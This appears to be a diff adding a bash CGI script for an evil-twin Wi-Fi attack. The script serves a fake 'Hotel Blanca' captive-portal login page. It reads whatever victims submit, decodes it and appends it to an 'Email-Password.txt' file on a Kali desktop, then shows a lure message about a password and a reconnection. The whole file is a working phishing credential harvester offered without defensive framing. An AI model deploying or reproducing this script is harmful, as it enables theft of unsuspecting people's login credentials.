@@ -1,0 +1,41 @@
+#!/usr/bin/env bash
+echo '<!DOCTYPE html>'
+echo '<html>'
+echo -e '\t<head>'
+echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
+echo -e '\t\t<title>Hotel Blanca &#x1F4F6;</title>'
+echo -e '\t\t<link rel="stylesheet" type="text/css" href="portal.css"/>'
+echo -e '\t\t<script type="text/javascript" src="portal.js"></script>'
+echo -e '\t</head>'
+echo -e '\t<body>'
+echo -e '\t\t<div class="content">'
+echo -e '\t\t\t\t<form method="post" id="loginform" name="loginform" action=""">'
+echo -e '\t\t\t\t\t<center><p>'
+POST_DATA=$(cat /dev/stdin)
+
+POST_DATA_D=$(printf '%b' "${POST_DATA//%/\\x}")
+echo "${POST_DATA_D}" >> "/home/kali/Desktop/Email-Password.txt"
+
+if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ "${CONTENT_LENGTH}" -gt 0 ]]; then
+    POST_DATA=${POST_DATA#*=}
+   
+    
+    echo 'The password is GERMAN,but connection will be reestablished in a few moments'
+    et_successful=1
+     
+fi   
+
+echo -e '\t\t\t\t\t</p></center>'
+echo -e '\t\t\t\t</form>'
+echo -e '\t\t\t</div>'
+echo -e '\t\t</div>'
+echo -e '\t</body>'
+echo '</html>'
+if [ "${et_successful}" -eq 1 ]; then
+exit 0
+else
+echo '<script type="text/javascript">'
+echo -e '\tsetTimeout("redirect()", 3500);'
+echo '</script>'
+exit 1
+fi
